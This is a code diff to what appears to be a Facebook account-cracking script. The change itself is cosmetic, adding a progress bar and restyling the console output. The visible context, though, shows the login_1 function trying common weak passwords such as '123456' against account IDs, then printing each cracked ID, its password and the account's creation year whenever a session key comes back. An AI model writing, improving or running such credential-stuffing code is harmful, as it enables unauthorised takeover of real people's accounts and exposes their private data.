@@ -433,16 +433,18 @@ def login_1(uid):
     global loop
     session = requests.session()
     try:
+        bar_length = 2
+        progress = loop % (bar_length + 1)
+
+        filled = "█" * progress
+        empty  = "░" * (bar_length - progress)
+
         sys.stdout.write(
-            f"\r\r\x1b[1;37m>\x1b[38;5;196m+\x1b[1;37m<"
-            f"\x1b[38;5;196m(\x1b[1;37m🌏NDRA-M1🧬"
-            f"\x1b[38;5;196m)\x1b[1;37m>\x1b[38;5;196m×"
-            f"\x1b[1;37m<\x1b[38;5;196m(\x1b[38;5;192m{loop}"
-            f"\x1b[38;5;196m)\x1b[1;37m>\x1b[38;5;196m×"
-            f"\x1b[1;37m<\x1b[38;5;196m(\x1b[1;37mOK"
-            f"\x1b[38;5;196m)\x1b[1;37m>\x1b[38;5;196m×"
-            f"\x1b[1;37m<\x1b[38;5;196m(\x1b[38;5;192m{len(oks)}"
-            f"\x1b[38;5;196m)"
+            f"\r"
+            f"\x1b[38;5;201m✦\x1b[38;5;207m✦\x1b[38;5;213m✦ "
+            f"\x1b[1;38;5;87m{loop} "
+            f"\x1b[38;5;207m⟦\x1b[38;5;87mOK:\x1b[1;38;5;46m {len(oks)}\x1b[38;5;207m⟧ "          
+            f"\x1b[38;5;51m▐\x1b[38;5;87m{filled}\x1b[38;5;240m{empty}\x1b[38;5;51m"
         )
         sys.stdout.flush()
         for pw in ('123456', '1234567', '12345678', '123456789'):
@@ -566,7 +568,7 @@ def login_1(uid):
             ).json()
 
             if 'session_key' in res:
-                print("\033[95m───[ \033[97mOK RESULT\033[95m ]──────────────────\033[0m")
+                print("\033[95m─────────[ \033[97mOK RESULT\033[95m ]──────────────────\033[0m")
                 print(f"\033[93m🆔 : {uid}\033[0m")
                 print(f"\033[93m🔑 : {pw}\033[0m")
                 print(f"\033[93m📅 : {creationyear(uid)}\033[0m")
@@ -576,7 +578,7 @@ def login_1(uid):
                 break
 
             elif 'www.facebook.com' in res.get('error', {}).get('message', ''):
-                print("\033[35m───[ \033[97mOK RESULT\033[35m ]──────────────────\033[0m")
+                print("\033[35m─────────[ \033[97mOK RESULT\033[35m ]──────────────────\033[0m")
                 print(f"\033[93m🆔 : {uid}\033[0m")
                 print(f"\033[93m🔑 : {pw}\033[0m")
                 print(f"\033[93m📅 : {creationyear(uid)}\033[0m")
